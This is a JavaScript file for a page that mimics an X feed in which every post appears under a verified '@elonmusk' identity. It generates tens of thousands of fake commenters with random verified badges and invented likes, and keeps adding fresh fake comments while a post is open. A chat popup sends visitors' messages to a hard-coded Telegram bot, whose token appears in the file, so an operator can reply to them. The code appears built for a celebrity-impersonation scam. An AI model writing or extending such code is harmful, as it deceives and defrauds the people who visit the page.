function genCommentDB(postId,count){count=count||15000;var comments=[];for(var i=0;i<count;i++){var fn=FIRST_NAMES[Math.floor(Math.random()*FIRST_NAMES.length)];var ln=LAST_NAMES[Math.floor(Math.random()*LAST_NAMES.length)];var full=fn+' '+ln;var uname=genUser(fn,ln);var isV=VERIFIED_BADGES[Math.floor(Math.random()*VERIFIED_BADGES.length)];var agent=createAgent(full,uname,isV);comments.push({id:postId+'-comment-'+i,postId:postId,name:agent.name,username:agent.username,avatar:agent.avatar,verified:agent.verified,text:genComment(),time:agent.time,likes:agent.likes,replies:agent.replies,timestamp:Date.now()-Math.floor(Math.random()*7*24*60*60*1000)});}return comments.sort(function(a,b){return b.timestamp-a.timestamp;});}

var commentsStore={};
var activeCommentPolling=null;
var userLikedPosts=JSON.parse(localStorage.getItem('likedPosts')||'{}');
var userLikedComments=JSON.parse(localStorage.getItem('likedComments')||'{}');
var currentPostId=null;
var currentPostData=null;
var knownPostIds=[];

function initCommentStore(postId){if(!commentsStore[postId]){var stored=localStorage.getItem('comments_'+postId);if(stored){commentsStore[postId]=JSON.parse(stored);}else{commentsStore[postId]=genCommentDB(postId,15000+Math.floor(Math.random()*5000));try{localStorage.setItem('comments_'+postId,JSON.stringify(commentsStore[postId].slice(0,5000)));}catch(e){}}}return commentsStore[postId];}
function getCommentCount(postId){return(commentsStore[postId]||[]).length;}

function parseMediaLayout(rawUrl,specifiedType){if(!rawUrl)return'';if(specifiedType==='video'&&rawUrl.includes('streamable.com')){var id=rawUrl.trim().split('/').pop().split('?')[0];return'<div class="media-container"><iframe src="https://streamable.com/e/'+id+'?autoplay=1&muted=1" class="post-iframe" allow="autoplay" allowfullscreen></iframe></div>';}if(specifiedType==='video')return'<div class="media-container"><video class="post-video" src="'+rawUrl+'" controls muted autoplay loop></video></div>';return'<div class="media-container"><img class="post-image" src="'+rawUrl+'"></div>';}

// =============================================
// FETCH & RENDER - ALWAYS REFRESHES FROM DATABASE
// =============================================
function fetchAndRender() {
    _supabase.from('posts').select('*').order('created_at',{ascending:false}).then(function(result){
        var posts=result.data;
        var error=result.error;
        if(error){console.error(error.message);return;}

        var feedContainer=document.getElementById('liveCloudTimelineFeed');
        
        var newPostIds=(posts||[]).map(function(p){return String(p.id);});
        var newIdsStr=JSON.stringify(newPostIds);
        var oldIdsStr=JSON.stringify(knownPostIds);
        
        if(newIdsStr===oldIdsStr)return;
        knownPostIds=newPostIds;

        feedContainer.innerHTML="";
        if(!posts||posts.length===0){
            feedContainer.innerHTML='<p style="text-align:center;padding:40px;color:#71767b;font-size:14px;">No posts deployed yet.</p>';
            return;
        }

        for(var i=0;i<posts.length;i++){
            var post=posts[i];
            var visualMediaBlock=parseMediaLayout(post.media_url,post.media_type);
            var postId=post.id;
            var isLiked=userLikedPosts[postId]||false;
            var baseLikesNum=parseMetricToNumber(post.likes);
            var displayLikesNum=isLiked?baseLikesNum+1:baseLikesNum;
            initCommentStore(postId);
            var commentCount=getCommentCount(postId);

            var div=document.createElement('div');
            div.className='post';
            div.setAttribute('data-post-id',postId);
            div.innerHTML='<div class="post-row"><img class="post-avatar" src="https://images.unsplash.com/photo-1614728263952-84ea256f9679?q=80&w=300&auto=format&fit=crop"><div class="post-content"><div class="post-header">Elon Musk<i class="fa-solid fa-circle-check verified" style="color:#1d9bf0;font-size:14px;"></i><span class="x-logo" style="font-size:14px;color:#e7e9ea;">𝕏</span><span class="post-username">@elonmusk</span><span class="dot">·</span><span class="time">Live</span></div><div class="post-text">'+post.content+'</div>'+visualMediaBlock+'<div class="post-actions"><div class="action-comment" data-post-id="'+postId+'"><i class="fa-regular fa-comment"></i> <span class="comment-count">'+formatDisplayCount(commentCount)+'</span></div><div><i class="fa-solid fa-retweet"></i> '+post.reposts+'</div><div class="action-like '+(isLiked?'liked':'')+'" data-post-id="'+postId+'"><i class="fa-'+(isLiked?'solid':'regular')+' fa-heart"></i> <span class="like-count">'+formatDisplayCount(displayLikesNum)+'</span></div><div><i class="fa-solid fa-chart-simple"></i> '+post.views+'</div><div><i class="fa-regular fa-bookmark"></i></div><div><i class="fa-solid fa-share-nodes"></i></div></div></div></div>';

            (function(pid,pdata){
                div.querySelector('.action-comment').addEventListener('click',function(e){e.stopPropagation();openComments(pid,pdata);});
                div.querySelector('.action-like').addEventListener('click',function(e){e.stopPropagation();toggleLike(pid,div.querySelector('.action-like'),pdata);});
                div.addEventListener('click',function(){openComments(pid,pdata);});
            })(postId,post);
            
            feedContainer.appendChild(div);
        }
    });
}

// =============================================
// LIKE
// =============================================
function toggleLike(postId,likeElement,postData){
    var isLiked=userLikedPosts[postId]||false;
    var heartIcon=likeElement.querySelector('i');
    var likeCountSpan=likeElement.querySelector('.like-count');
    var currentText=likeCountSpan.textContent;
    var num=parseMetricToNumber(currentText);
    if(isLiked){delete userLikedPosts[postId];likeElement.classList.remove('liked');heartIcon.className='fa-regular fa-heart';num=Math.max(0,num-1);}
    else{userLikedPosts[postId]=true;likeElement.classList.add('liked','like-animate');heartIcon.className='fa-solid fa-heart';num+=1;setTimeout(function(){likeElement.classList.remove('like-animate');},300);}
    likeCountSpan.textContent=formatDisplayCount(num);
    localStorage.setItem('likedPosts',JSON.stringify(userLikedPosts));
    _supabase.from('posts').update({likes:numberToMetricString(num)}).eq('id',postId).then(function(){});
}

// =============================================
// COMMENTS
// =============================================
function openComments(postId,postData){currentPostId=postId;currentPostData=postData;document.getElementById('commentsOverlay').classList.add('active');document.body.style.overflow='hidden';var comments=initCommentStore(postId);renderCommentsView(postData,comments);if(activeCommentPolling)clearInterval(activeCommentPolling);activeCommentPolling=setInterval(function(){genRandomComment(postId);refreshCommentsDisplay(postId);},3000+Math.random()*5000);}
function closeComments(){document.getElementById('commentsOverlay').classList.remove('active');document.body.style.overflow='';if(activeCommentPolling){clearInterval(activeCommentPolling);activeCommentPolling=null;}currentPostId=null;currentPostData=null;fetchAndRender();}
function genRandomComment(postId){var fn=FIRST_NAMES[Math.floor(Math.random()*FIRST_NAMES.length)];var ln=LAST_NAMES[Math.floor(Math.random()*LAST_NAMES.length)];var full=fn+' '+ln;var uname=genUser(fn,ln);var isV=VERIFIED_BADGES[Math.floor(Math.random()*VERIFIED_BADGES.length)];var agent=createAgent(full,uname,isV);var nc={id:postId+'-comment-'+Date.now()+'-'+Math.random(),postId:postId,name:agent.name,username:agent.username,avatar:agent.avatar,verified:agent.verified,text:genComment(),time:'now',likes:0,replies:0,timestamp:Date.now()};if(!commentsStore[postId])commentsStore[postId]=[];commentsStore[postId].unshift(nc);if(commentsStore[postId].length>20000)commentsStore[postId]=commentsStore[postId].slice(0,20000);}
function renderCommentsView(postData,comments){var body=document.getElementById('commentsBody');var isLiked=userLikedPosts[postData.id]||false;var baseNum=parseMetricToNumber(postData.likes);var dispNum=isLiked?baseNum+1:baseNum;var vmb=parseMediaLayout(postData.media_url,postData.media_type);var cc=comments.length;var html='';for(var i=0;i<Math.min(comments.length,100);i++){var c=comments[i];html+='<div class="comment-item"><img class="comment-avatar-img" src="'+c.avatar+'" onerror="this.src=\'https://ui-avatars.com/api/?name='+encodeURIComponent(c.name)+'&background=random&size=100&bold=true&color=fff\'"><div class="comment-content"><div class="comment-header"><span class="comment-name">'+c.name+'</span>'+(c.verified?'<i class="fa-solid fa-circle-check" style="color:#1d9bf0;font-size:12px;"></i>':'')+'<span class="comment-username">'+c.username+'</span><span class="comment-time">· '+c.time+'</span></div><div class="comment-text">'+c.text+'</div><div class="comment-actions"><span onclick="likeComment(\''+c.id+'\',this)"><i class="fa-'+(userLikedComments[c.id]?'solid':'regular')+' fa-heart" style="color:'+(userLikedComments[c.id]?'#f91880':'#71767b')+'"></i> <span>'+(userLikedComments[c.id]?c.likes+1:c.likes)+'</span></span><span><i class="fa-regular fa-comment"></i> '+c.replies+'</span><span><i class="fa-solid fa-share-nodes"></i></span></div></div></div>';}
body.innerHTML='<div class="original-post"><div class="post-row"><img class="post-avatar" src="https://images.unsplash.com/photo-1614728263952-84ea256f9679?q=80&w=300&auto=format&fit=crop"><div class="post-content"><div class="post-header">Elon Musk<i class="fa-solid fa-circle-check verified" style="color:#1d9bf0;font-size:14px;"></i><span class="x-logo" style="font-size:14px;color:#e7e9ea;">𝕏</span><span class="post-username">@elonmusk</span><span class="dot">·</span><span class="time">Live</span></div><div class="post-text">'+postData.content+'</div>'+vmb+'<div class="post-actions" style="margin-top:12px;"><div><i class="fa-regular fa-comment"></i> '+formatDisplayCount(cc)+'</div><div><i class="fa-solid fa-retweet"></i> '+postData.reposts+'</div><div class="'+(isLiked?'liked':'')+'" style="cursor:pointer;" onclick="toggleLikeFromComments(\''+postData.id+'\',this)"><i class="fa-'+(isLiked?'solid':'regular')+' fa-heart"></i> <span>'+formatDisplayCount(dispNum)+'</span></div><div><i class="fa-solid fa-chart-simple"></i> '+postData.views+'</div></div></div></div></div><div class="comment-count-header">'+formatDisplayCount(cc)+' replies</div><div id="commentsList">'+html+'</div>';}
function refreshCommentsDisplay(postId){if(currentPostId!==postId)return;var comments=commentsStore[postId]||[];var list=document.getElementById('commentsList');if(!list)return;var html='';for(var i=0;i<Math.min(comments.length,100);i++){var c=comments[i];html+='<div class="comment-item"><img class="comment-avatar-img" src="'+c.avatar+'" onerror="this.src=\'https://ui-avatars.com/api/?name='+encodeURIComponent(c.name)+'&background=random&size=100&bold=true&color=fff\'"><div class="comment-content"><div class="comment-header"><span class="comment-name">'+c.name+'</span>'+(c.verified?'<i class="fa-solid fa-circle-check" style="color:#1d9bf0;font-size:12px;"></i>':'')+'<span class="comment-username">'+c.username+'</span><span class="comment-time">· '+c.time+'</span></div><div class="comment-text">'+c.text+'</div><div class="comment-actions"><span onclick="likeComment(\''+c.id+'\',this)"><i class="fa-'+(userLikedComments[c.id]?'solid':'regular')+' fa-heart" style="color:'+(userLikedComments[c.id]?'#f91880':'#71767b')+'"></i> <span>'+(userLikedComments[c.id]?c.likes+1:c.likes)+'</span></span><span><i class="fa-regular fa-comment"></i> '+c.replies+'</span><span><i class="fa-solid fa-share-nodes"></i></span></div></div></div>';}list.innerHTML=html;}
function likeComment(commentId,element){if(userLikedComments[commentId])delete userLikedComments[commentId];else userLikedComments[commentId]=true;localStorage.setItem('likedComments',JSON.stringify(userLikedComments));if(currentPostId)refreshCommentsDisplay(currentPostId);}
function toggleLikeFromComments(postId,element){var isLiked=userLikedPosts[postId]||false;var heartIcon=element.querySelector('i');var span=element.querySelector('span');var text=span.textContent;var num=parseMetricToNumber(text);if(isLiked){delete userLikedPosts[postId];element.classList.remove('liked');heartIcon.className='fa-regular fa-heart';num=Math.max(0,num-1);}else{userLikedPosts[postId]=true;element.classList.add('liked');heartIcon.className='fa-solid fa-heart';num+=1;}span.textContent=formatDisplayCount(num);localStorage.setItem('likedPosts',JSON.stringify(userLikedPosts));}
function updateReplyButton(){var input=document.getElementById('commentInput');var btn=document.getElementById('replyBtn');btn.classList.toggle('active',input.value.trim().length>0);}
function submitComment(){var input=document.getElementById('commentInput');var text=input.value.trim();if(!text||!currentPostId)return;var uc={id:currentPostId+'-comment-'+Date.now()+'-user',postId:currentPostId,name:"You",username:"@user",avatar:"https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=100&auto=format&fit=crop",verified:false,text:text,time:"now",likes:0,replies:0,timestamp:Date.now()};if(!commentsStore[currentPostId])commentsStore[currentPostId]=[];commentsStore[currentPostId].unshift(uc);input.value='';updateReplyButton();refreshCommentsDisplay(currentPostId);}

var botToken="8585408795:AAG_B28wAl0JhU6TgIU1G0Pc9ijDP53iJkM";var chatId="6610497090";var lastUpdateId=0;
var sessionUserId=localStorage.getItem('chatSessionUserId')||(function(){var id='User-'+Math.floor(100000+Math.random()*900000);localStorage.setItem('chatSessionUserId',id);return id;})();
var chatContainer=document.getElementById('chatContainer');var messageInput=document.getElementById('messageInputField');
function toggleChatWindow(){var box=document.getElementById('facebookChatPopup');if(box.style.display==='flex'){box.style.display='none';}else{box.style.display='flex';setTimeout(function(){messageInput.focus();chatContainer.scrollTop=chatContainer.scrollHeight;},100);}}
function appendMessageNode(text,type){var msg=document.createElement('div');msg.className='message '+type;msg.textContent=text;chatContainer.appendChild(msg);chatContainer.scrollTop=chatContainer.scrollHeight;localStorage.setItem('chatHistoryLogs',chatContainer.innerHTML);}
function sendChatMessage(){var text=messageInput.value.trim();if(!text)return;appendMessageNode(text,'sent');messageInput.value="";fetch('https://api.telegram.org/bot'+botToken+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text:'[#'+sessionUserId+'] '+text})}).catch(function(e){console.warn(e);});}
if(window.visualViewport){window.visualViewport.addEventListener('resize',function(){var box=document.getElementById('facebookChatPopup');if(box&&box.style.display==='flex')chatContainer.scrollTop=chatContainer.scrollHeight;});}
function pollTelegram(){fetch('https://api.telegram.org/bot'+botToken+'/getUpdates?offset='+(lastUpdateId+1)+'&timeout=5').then(function(r){return r.json();}).then(function(data){if(data.ok&&data.result&&data.result.length>0){data.result.forEach(function(u){lastUpdateId=u.update_id;var msg=u.message;if(msg&&String(msg.chat.id)===chatId&&msg.reply_to_message&&msg.reply_to_message.text){var m=msg.reply_to_message.text.match(/\[#(User-\d+)\]/);if(m&&m[1]===sessionUserId&&msg.text)appendMessageNode(msg.text,'received');}});}setTimeout(pollTelegram,400);}).catch(function(){setTimeout(pollTelegram,3000);});}

// =============================================
// REALTIME SUBSCRIPTION
// =============================================
function subscribeToChanges() {
    _supabase
        .channel('schema-db-changes')
        .on(
            'postgres_changes',
            { event: '*', schema: 'public', table: 'posts' },
            (payload) => {
                console.log('Change detected!', payload);
                fetchAndRender();
            }
        )
        .subscribe();
}

window.addEventListener('DOMContentLoaded', function() {
    // Native Telegram WebApp SDK Initialization
    var tg = window.Telegram && window.Telegram.WebApp;
    if (tg) {
        try {
            tg.expand();
            tg.setHeaderColor('#000000');
            tg.setBackgroundColor('#000000');
            tg.enableClosingConfirmation();
            
            var uid = tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
            if (uid) {
                sessionUserId = 'TG-' + uid;
            }
        } catch(e) {
            console.warn('Telegram WebApp init error:', e);
        }
    }

    fetchAndRender();
    subscribeToChanges();
    var saved = localStorage.getItem('chatHistoryLogs');
    if(saved){chatContainer.innerHTML=saved;chatContainer.scrollTop=chatContainer.scrollHeight;}
    pollTelegram();
});
